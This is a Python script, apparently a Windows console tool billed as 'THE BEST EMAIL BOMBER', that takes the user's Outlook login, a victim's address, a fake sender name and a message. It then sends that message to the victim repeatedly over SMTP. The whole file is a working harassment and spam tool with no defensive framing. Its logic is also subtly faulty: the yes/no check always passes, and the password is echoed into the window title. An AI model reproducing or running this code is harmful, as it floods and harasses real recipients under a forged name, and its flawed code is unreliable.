import os
import sys
import random
import smtplib
import getpass
import time
import colorama
from colorama import Fore, Back, Style
import ctypes

def bombah():
    os.system('cls')
    print(Fore.BLUE + """
███████╗███╗░░░███╗░█████╗░██╗██╗░░░░░  ██████╗░░█████╗░███╗░░░███╗██████╗░███████╗██████╗░
██╔════╝████╗░████║██╔══██╗██║██║░░░░░  ██╔══██╗██╔══██╗████╗░████║██╔══██╗██╔════╝██╔══██╗
█████╗░░██╔████╔██║███████║██║██║░░░░░  ██████╦╝██║░░██║██╔████╔██║██████╦╝█████╗░░██████╔╝
██╔══╝░░██║╚██╔╝██║██╔══██║██║██║░░░░░  ██╔══██╗██║░░██║██║╚██╔╝██║██╔══██╗██╔══╝░░██╔══██╗
███████╗██║░╚═╝░██║██║░░██║██║███████╗  ██████╦╝╚█████╔╝██║░╚═╝░██║██████╦╝███████╗██║░░██║
╚══════╝╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝╚══════╝  ╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═════╝░╚══════╝╚═╝░░╚═╝
    """ + Fore.RESET)
    ctypes.windll.kernel32.SetConsoleTitleW("BEST EMAIL BOMBER EVER!")
    print(Fore.GREEN + "THE BEST EMAIL BOMBER!")
    print(Fore.CYAN + "PLEASE GIVE CREDITS TO TOG!")
    print(Fore.GREEN + "Starting The Program...")
    time.sleep(3)
    os.system('cls')
    email = input(Fore.YELLOW + "Enter Your Email: ")
    ctypes.windll.kernel32.SetConsoleTitleW("Your Mail -> " + email)
    password = input(Fore.YELLOW + "Enter Your Password: ")
    ctypes.windll.kernel32.SetConsoleTitleW("Your Password -> " + password)
    victim = input(Fore.RED + "Enter Victims Mail ID: ")
    ctypes.windll.kernel32.SetConsoleTitleW("Victims Mail ID -> " + victim)
    spoofmail = input(Fore.YELLOW + "What Do You Want The Victim To See Your Name As: ")
    content = input(Fore.YELLOW + "Enter The Message You Want To Spam: ")
    ctypes.windll.kernel32.SetConsoleTitleW("Message To Send -> " + content)
    amount = int(input(Fore.YELLOW + "How Many Mails: "))
    os.system('cls')
    print(Fore.GREEN + "The Following Details Have Been Set...")
    print(" ")
    print(Fore.MAGENTA + "Your Mail -> " + email)
    print(Fore.MAGENTA + "Your Password -> " + password)
    print(Fore.MAGENTA + "Victims Mail ID -> " + victim)
    print(" ")
    print(Fore.RED + "Message To Send -> " + content)
    print(Fore.RED + "Messages To Send -> " + str(amount))

    k = input("Are You Sure You Want To Continue? [y/n]: ")
    count = 0
    if k == 'y' or 'Y':
        mail = smtplib.SMTP('smtp.outlook.com', 587)
        mail.ehlo()
        mail.starttls()
        for i in range(amount):
            try:
                mail.login(email, password)
            except Exception as e:
                print(Fore.RED + "An Error Occured -> " + str(e))
                time.sleep(3)
                break
                os.system('cls')
                bombah()
            mail.sendmail(spoofmail, victim, content)
            count += 1
            os.system('cls')
            print(Fore.GREEN + "Sent -> " + content + " | To -> " + victim + " | In The Name Of -> " + spoofmail + " | " + str(count) + " Times!")
            ctypes.windll.kernel32.SetConsoleTitleW("Sent -> " + content + " | To -> " + victim + " | In The Name Of -> " + spoofmail + " | " + str(count) + " Times!")
        mail.close()
        print(Fore.GREEN + "Logged Out!")
        ctypes.windll.kernel32.SetConsoleTitleW("LOGGED OUT!")
        time.sleep(2)
        os.system('cls')
        bombah()
    elif k == 'n' or 'N':
        print(Fore.YELLOW + "Alright, Going To Main Menu In 2 Seconds...")
        time.sleep(2)
        os.system('cls')
        bombah()
    else:
        print(Fore.RED + "INVALID CHOICE -> GOING BACK TO MAIN MENU!")
        time.sleep(2)
        os.system('cls')
        bombah()

bombah()